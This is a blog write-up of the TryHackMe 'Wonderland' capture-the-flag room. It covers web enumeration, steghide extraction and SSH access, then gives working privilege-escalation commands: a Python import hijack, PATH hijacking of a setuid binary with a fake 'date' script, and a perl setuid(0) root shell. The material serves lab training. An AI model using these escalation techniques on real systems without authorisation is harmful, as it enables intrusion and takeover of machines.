---
layout: post
title:  "Wonderland on Tryhackme"
date:   2020-11-15 12:00 +0200
description: "Walkthrough of Wonderland on TryHackme"
tags: webenum LFI SUID script
permalink: "/categories/:categories"
author: Zebra
image: /assets/img/thm-images/wonderland2.jpeg
categories: tryhackme wonderland
---

**[THM Wonderland Link][thmlink]**  
# Wonderland CTF WriteUp  
## by Zebra  
  
| Room        | Date        | Difficulty | Type         | Time | Own Intention | Machine  |
| ----------- | ----------- | ---------- | ------------ | ---- | ------------- | -------- |
| Wonderland  | 15.11.2020  | Medium     | Challenge    | 1,5h | Medium        | Linux    |

------------------------ 
  
### <ins>Tasks</ins>  
  
| Task      | Question                                                  |
| --------- | --------------------------------------------------------- |
| Task 1.1  | Obtain the flag in user.txt                               |
| Task 1.2  | Escalate your privileges, what is the flag in root.txt?   |
  
  
--- 
  

## <ins>Introduction</ins>  
  

Hello and welcome to the write-up of the room “Wonderland” on tryhackme.      
Wonderland is a room marked as medium and in my opinion its also an medium one.
We will start as always do with an nmap scan and web enumeration. The web enumeration
will be the most intensive part at the beginning. After we find a few pictures and
run image tools on them we find hint for a web directory and get credentials for
ssh. We have to enumerate 3 users on the system to get root. Our first user escalation we done 
with a python import script. For the escalation from user 2 to user 3 we use a manipulated 
binary and path. Finally to get root we take the advantage of a vulnerable capability.
  
    
**So let's begin:**    
      
  

---
  


## <ins>Preparation Steps</ins>  
  
> 
```bash	
mkdir wonderland    #New Room folder
cd wonderland       #Move into folder
mkdir nmap  	  #Nmap directory
mkdir gobuster  #Gobuster directory
sudo nano /etc/hosts #$ip wonderland.thm
export target=10.10.236.246
export golist=/usr/share/seclists/Discovery/Web-Content/common.txt
export rockyou=/usr/share/wordlists/rockyou.txt
```  
  

---

  
    
# <ins>Scanning and Enumeration</ins>

Lets begin with a standard nmap scan for common ports. After that check all ports
for don't let a port pass out of our attention. 
  

## <ins>Nmap Scan</ins>
  
1. Nmap initial scan
2. Nmap all ports check
3. If necessary fire up a all port scan.


```sh
$nmap -sC -sV -oN ./nmap/intial wonderland.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```  
  
#-sC = Scan with default NSE scripts.  
#-sV = Attempts to determine the version of the service running on port.  
#-oN = Normal output to the file.  
  
> the all port scan don't show anything new.
  

| Port        | Service       | Information's                   |
| ----------- | -----------   | ------------------------------- | 
| 22/tcp      | ssh           | OpenSSH 7.6p1 Ubuntu            |
| 80/tcp      | http          | Golang net/http server          |
  
  
  
---
  
  
# <ins>Web Enumeration</ins>  
  

## <ins>Visite web-pages:</ins>   
  
  
Firefox: `wonderland.thm`  
  
Check the source code and find a image called "white_rabbit_1.jpg". Download this via `wget <link>` for
further image enumeration.
  
  
  
---
  
  
  
## <ins>Web directory enumeration:</ins>
  
  
We could use one of our preferred tools like dirbuster, gobuster or dirsearch.
I will use dirbuster (gui edition) this time.


### <ins>Dirbuster recursive scan:</ins>  
  
Start dirbuster gui and setup:  
  
target url: http://10.10.236.246/  
Threads: 40  
wordlist attack : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  
Starting options (only active): Brute Dir, Be Recursive and Dir to start "/".  
And so we find an interesting path.    
Dirbuster set the recursive mode by default. So you can get the following path.  
  
  
<center><p><img src="/assets/img/thm-images/wonderland_dirb_small.png" /></p></center>  
   
  
Output:    
    
  
| Path                | type             | priority | information                           |
| ------------------- | ---------------  | -------- | ------------------------------------- |
| /img/               | file-r           | medium   | 3 new images to download              |
| /r/a/b/b/i/t        | html             | high     | creds in source code                  |
| /poem/              | html             | low      | nothing really helpful                |
  
  
## <ins>Check Web directories:</ins>
  
  
Firefox: `wonderland.thm/r/a/b/b/i/t`
  
Check the source and find the ssh credentials.
   
  
---
  
  
# <ins>Image enumeration</ins>


### <ins>Downloaded files:</ins>  

 
1. alice_door.png
2. alice_door.jpg
3. white_rabbit_1.jpg
  

### <ins>Extraction:</ins>
  
`steghide --info <filename> -p ""`

The only file with an interesting file in it is **white_rabbit_1.jpg**.
  
Extract:  
`steghide extract -sf white_rabbit_1.jpg -p ""`
  
  
Results:  
- "hint.txt" out of white_rabbit_1.jpg
  
```sh
cat hint.txt
follow the r a b b i t
```
  

### <ins>Conclusion:</ins>
  
As I read "Follow the rabbit" the first thing i recognized were the spaces between
the word "rabbit". The combination out of this hint.txt and our dirbuster results are,
that this text file is also an hint to the hidden web directory. If you extract it while
dirbuster is running, perhaps you find it before ending the scan.  
  
  
    
---
  
  
  
# <ins>System enumeration</ins>  
  


## <ins>Alice enumeration (user.txt):</ins>
  
  
Login via ssh with the credentials of the source code of "http://wonderland.thm/r/a/b/b/i/t/"
  
`ssh alice@10.10.236.246`
  
```sh
ls -la
lrwxrwxrwx 1 root  root     9 May 25 17:52 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25 02:36 .bash_logout
-rw-r--r-- 1 alice alice 3771 May 25 02:36 .bashrc
drwx------ 2 alice alice 4096 May 25 16:37 .cache
drwx------ 3 alice alice 4096 May 25 16:37 .gnupg
drwxrwxr-x 3 alice alice 4096 May 25 02:52 .local
-rw-r--r-- 1 alice alice  807 May 25 02:36 .profile
-rw------- 1 root  root    66 May 25 17:08 root.txt
-rw-r--r-- 1 root  root  3577 May 25 02:43 walrus_and_the_carpenter.py
```
  
### <ins>Interesting files:</ins>
  
- root.txt (but no rw permissions)
- walrus_and_the_carpenter.py (r permissions)
- .bash_history (directed to /dev/null -> so nothing here)
  
When root.txt is in /home/alice. Where could be user.txt?  
-> right. At /root/user.txt (locate and find at "user.txt" no results)
  
```sh
alice@wonderland:~$ locate user.txt
alice@wonderland:~$ ls -la /root/user.txt
-rw-r--r-- 1 root root 32 May 25 16:40 /root/user.txt
alice@wonderland:~$ wc -c /root/user.txt
32 /root/user.txt
```
  
  
###
**Task 1.1 solved**
###  
  

---
   
  
## <ins>Alice escalation:</ins>  
  
First we do some manual enumeration with the following commands:  
  
- ls -la /home (user: alice, hatter, rabbit, tryhackme) 
- cat /etc/passwd (save to local)
- cat /etc/crontab (nothing here)
- getcap -r / 2>/dev/null (**Perl** will be interesting, but only for hatter)
- sudo -l (walrus_and_the_carpenter.py by other user **Escalating chance**)


We will start with tht sudo "pyhton script" by rabbit.  
  
Download the "walrus_and_the_carpenter.py" with a method of your choice (python http server -> wget or curl, base64 encoding -> decoding, pwncat download, scp download).
  
Why is that python script interesting for us?! Cause it is owned by **root**.  
  
> all files owned by root are interesting for us.
  
Cause we have ssh connection I decide to download it with **scp**.
  
`scp alice@10.10.236.246:/home/alice/walrus_and_the_carpenter.py <local directory>`
  

If we analyze the .py file locally we see that the script use "import random" and cat out a random string of the poem on "http://wonderland.thm/poem/".  
    
```python
import random
poem = "The sun was shining on the sea,
          ...."
for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```
  
We could your the import function of py to escalate the user cause there are three ways python import things.  
1. Current directory of the script
2. system.lib
3. python.lib
  
  
[Python Import Documentation](https://realpython.com/absolute-vs-relative-python-imports/)  
  

### <ins>python import script:</ins>  
     
@alice:
  
```sh
alice@wonderland:~$ sudo -l
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
alice@wonderland:~$ pwd
/home/alice
alice@wonderland:~$ echo -en 'import os\nos.system("/bin/bash -p")' > random.py
alice@wonderland:~$ cat random.py 
import os
os.system("/bin/bash -p")alice@wonderland:~$ 
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$ whoami
rabbit
```
  
[Escalation Link](https://gtfobins.github.io/gtfobins/python/)
  
  

---
  
  
  
## <ins>Rabbit enumeration:</ins>
  
Now we are rabbit and go to the home directory if rabbit with `cd /home/rabbit/`.

  
```sh
/home/rabbit$ ls -la
drwxr-x--- 2 rabbit rabbit  4096 May 25 17:58 .
drwxr-xr-x 6 root   root    4096 May 25 17:52 ..
lrwxrwxrwx 1 root   root       9 May 25 17:53 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25 03:01 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25 03:01 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25 03:01 .profile
-rwsr-sr-x 1 root   root   16816 May 25 17:58 teaParty
/home/rabbit$ file teaParty 
teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped
```

-> Only interesting thing is the binary teaParty.  
Download the binary and analyze with [ghidra](https://ghidra-sre.org/InstallationGuide.html#Install).
  
@rabbit: `python3 -m http.server 9999`  
@local:  `wget http://wonderland.thm:9999/teaParty` , `ghidra teaParty` 

> You could also use `strings teaParty`, but its a bit harder to read.


<center><p><img src="/assets/img/thm-images/wonderland_ghidra.png" /></p></center>
  
  
### <ins>teaParty:<ins>  
  
run teaparty on rabbit:
  
```sh
/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Sun, 15 Nov 2020 17:09:39 +0000
Ask very nicely, and I will give you some tea while you wait for him

Segmentation fault (core dumped)
```

-> We could really figured out, how to exploit by only running this. So check with ghidra.
  

In the main function of the teaParty binary we see that the following command is used:  
`/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R`
  
-> We see that the program uses /bin/eco with a full path and date without a full path.
  
Our way will be create a reverse named "date" and manipulate the **$PATH**.
  

## <ins>Rabbit escalation:</ins>
  
Setup date:
  
```sh
/home/rabbit$ mkdir esc
rabbit@wonderland:/home/rabbit$ cd esc
/home/rabbit/esc$ echo -en '#!/bin/bash\nbash -p' > date
rabbit@wonderland:/home/rabbit/esc$ cat date 
#!/bin/bash
bash -p
rabbit@wonderland:/home/rabbit/esc$ chmod +x date
```
  
Setup $PATH:  

`echo $PATH` (alway backup the path!)  
`export PATH=/home/rabbit/esc/:$PATH` (new PATH)

Escalate by run **./teaParty** in /home/rabbit.
  

  
---
  

## <ins>hatter enumeration:</ins>
  
Check out the home directory of hatter and find his password to ssh.

Get in via ssh because in our actual session we are in the group of rabbit.  
  
```ssh
hatter@wonderland:/usr/bin$ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
```
  

---
  
  
# <ins>Privilege escalation to root</ins>  
  

  
We check our enumeration out of alice and and find the the vuln on perl.

  
```sh
/home/rabbit$ ls -la /usr/bin/perl
-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl
```

Check [GTFObins](https://gtfobins.github.io/gtfobins/perl/) and get the
command for pawning a shell out of the section "capabilities".
  
`./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`
  
  
```sh
hatter@wonderland:~$ id
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# bash -i
root@wonderland:~# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
root@wonderland:~# wc -c /home/alice/root.txt 
66 /home/alice/root.txt
```
  

###
**Task 1.2 solved**
### 
  


<a href="https://www.c-ville.com/wp-content/uploads/2013/04/Root-the-box-660x335.jpg" rel="follow"><left><img src="/assets/img/thm-images/root.jpg" />  
  

   
---
  
  
# <ins>What we learned:</ins>

1. Web enumeration recursively with **dirbuster**
2. Escalate via Python import
3. Escalate via binary on a changed $PATH
4. Usage of capabilities to escalate to root





---  
  
[thmlink]: https://tryhackme.com/room/wonderland
